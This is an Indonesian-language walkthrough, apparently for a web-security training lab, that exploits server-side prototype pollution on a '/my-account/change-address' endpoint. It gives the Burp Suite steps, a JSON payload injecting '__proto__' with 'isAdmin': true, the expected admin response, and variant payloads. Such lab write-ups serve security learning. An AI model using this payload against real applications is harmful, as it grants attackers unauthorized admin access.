# Manual Exploitation Guide: Server-Side Prototype Pollution

Panduan ini menjelaskan cara melakukan injeksi secara manual menggunakan **Burp Suite** atau **cURL**.

## Target Endpoint
- **URL**: `/my-account/change-address`
- **Method**: `POST`
- **Content-Type**: `application/json`

## Langkah-langkah (Burp Suite)

1.  **Intercept Request**:
    - Login sebagai user biasa (`wiener`).
    - Lakukan update address sembarang.
    - Tangkap request tersebut di Burp Suite (Proxy/Repeater).

2.  **Identifikasi JSON Body**:
    Request asli akan terlihat seperti ini:
    ```json
    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "..."
    }
    ```

3.  **Sisipkan Payload**:
    Tambahkan properti `__proto__` ke dalam JSON.
    Warning: Pastikan syntax JSON valid (koma penutup, kurung kurawal).

    **Payload:**
    ```json
    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "...",
        "__proto__": {
            "isAdmin": true
        }
    }
    ```

4.  **Kirim Request (Send)**:
    - Kirim request yang sudah dimodifikasi.

5.  **Verifikasi Response**:
    - Perhatikan response JSON dari server.
    - Jika berhasil, Anda akan melihat `isAdmin: true` di dalam response (yang sebelumnya `false` atau tidak ada).
    - Contoh Response Sukses:
      ```json
      {
          "username": "wiener",
          "isAdmin": true,
          ...
      }
      ```

6.  **Verifikasi Browser**:
    - Refresh halaman `/my-account` di browser.
    - Link **Admin panel** akan muncul di navigasi atas.

## Tips Ekstra
- Jika tidak berhasil, coba variasi payload lain seperti:
  - `constructor.prototype`
  - `__proto__.isAdmin` (nested)
- Pastikan `sessionId` valid dan sesuai dengan cookie sesi Anda.
